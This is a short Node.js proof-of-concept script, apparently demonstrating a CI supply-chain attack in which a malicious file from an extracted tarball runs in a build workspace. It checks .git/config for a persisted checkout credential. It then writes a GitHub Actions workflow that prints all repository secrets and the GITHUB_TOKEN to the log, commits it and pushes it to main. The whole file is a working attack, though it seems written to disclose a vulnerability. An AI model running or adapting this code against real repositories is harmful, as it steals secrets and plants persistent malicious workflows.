const fs = require('fs');
const { execSync } = require('child_process');
console.log('PAYLOAD: attacker-controlled add-to-registry.js executed in workspace ' + process.cwd());

let cfg = '';
try { cfg = fs.readFileSync('.git/config', 'utf8'); } catch (e) {}
console.log('PAYLOAD: persisted checkout credential present = ' + /extraheader/i.test(cfg));

const wf = [
  'name: leak',
  'on:',
  '  workflow_dispatch:',
  'jobs:',
  '  x:',
  '    runs-on: ubuntu-latest',
  '    steps:',
  '      - name: dump',
  '        env:',
  '          S: ${{ toJSON(secrets) }}',
  '          T: ${{ secrets.GITHUB_TOKEN }}',
  '        run: |',
  '          echo "LEAKED_SECRETS_BEGIN"',
  '          echo "$S"',
  '          echo "LEAKED_SECRETS_END"',
  ''
].join('\n');
fs.mkdirSync('.github/workflows', { recursive: true });
fs.writeFileSync('.github/workflows/leak.yml', wf);
execSync('git config user.email poc@example.invalid && git config user.name poc && git add .github/workflows/leak.yml && git commit -m "poc: workflow pushed by extracted tarball payload" && git push origin HEAD:main', { stdio: 'inherit' });
